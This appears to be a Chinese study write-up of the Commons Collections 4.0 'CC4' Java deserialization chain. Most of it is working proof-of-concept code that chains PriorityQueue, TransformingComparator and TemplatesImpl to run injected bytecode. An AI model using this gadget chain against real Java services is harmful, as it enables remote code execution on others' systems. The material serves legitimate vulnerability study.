# 分析版本

Commons Collections 4.0

JDK 8u65

环境配置参考[JAVA安全初探(三):CC1链全分析](https://xz.aliyun.com/t/12669?time__1311=mqmhDvqIxfgD8DlxGo4%2bxCw67o7KKG=z4D&amp;alichlgref=https://www.google.com/)

# 分析过程

**在Commons Collections 4.0中，TransformingComparator类变为可序列化类，增加了一条攻击链。**

CC4在CC3的基础上，改变了利用链的入口类。（CC3利用是任意代码执行比runtime命令执行可利用性更强）

寻找ChainedTransformer.transform的调用，找到了TransformingComparator.compare

![image-20240708112104358](https://s2.loli.net/2024/07/08/Op7mqWhUDvgdIBw.png)

```java
public int compare(final I obj1, final I obj2) {
    final O value1 = this.transformer.transform(obj1);
    final O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```

TransformingComparator的构造函数又可以给transformer传值。我们将ChainedTransformer（实现任意代码执行）传给transformer，而ChainedTransformer.transform()中传值任意都可以（因为tranforme数组第一个元素是ConstantTransformer）

所以再找一个readObject，可以调用TransformingComparator.compare()就行，传值任意。

**之后作者是找到了PriorityQueue.readObject  ->  heapify() ->  siftDown  ->  siftDownUsingComparator**

```java
private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```

```java
private final Comparator<? super E> comparator;  //TransformingComparator类实现了Comparator接口
```

我们保证comparator是TransformingComparator类，而comparator又可以通过构造函数赋值，到这利用链完成。

更新Poc

```java
public class cc4 {
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ss.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {
        //ChainedTransformer
        //PriorityQueue
        //CC3
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //chainedTransformer.transform(1);

        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        serialize(priorityQueue);
        unserialize("ss.ser");

    }
}
```

执行没反应

这是因为在入口类中PriorityQueue有些参数需要控制

![image-20240708114411102](https://s2.loli.net/2024/07/08/5bXOLfAd19s4TuB.png)

heapify中 size传入的是0，没有进入for循环。

`>>>`是无符号右移运算符，右移n位，高位补零。size最小取2，`>>>size`才大于0。

所以我们在队列中加入两个1，让size=2。

更新Poc

```java
public class cc4 {
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ss.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {
        //ChainedTransformer
        //PriorityQueue
        //CC3
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //chainedTransformer.transform(1);

        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(1);

        serialize(priorityQueue);
        unserialize("ss.ser");

    }
}
```

这次在执行序列化时计算器就被弹出了，和URLDNS链一样利用链在序列化时就被走了一遍。

这里是在priorityQueue.add(1);时触发的利用链

![image-20240708135212518](https://s2.loli.net/2024/07/08/MvDiwOuB5nQ9cxZ.png)

防止这种情况就是在add之前把链断掉，add之后序列化之前再通过反射把利用链写好。

```java
public class cc4 {
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ss.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {
        //ChainedTransformer
        //PriorityQueue
        //CC3
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //chainedTransformer.transform(1);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1)); //改为ConstantTransformer,把利用链断掉
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(1);

        Class transformingComparatorClass = transformingComparator.getClass();            //通过反射把利用链改回
        Field transformer = transformingComparatorClass.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator, chainedTransformer);

        //serialize(priorityQueue);
        unserialize("ss.ser");

    }
}
```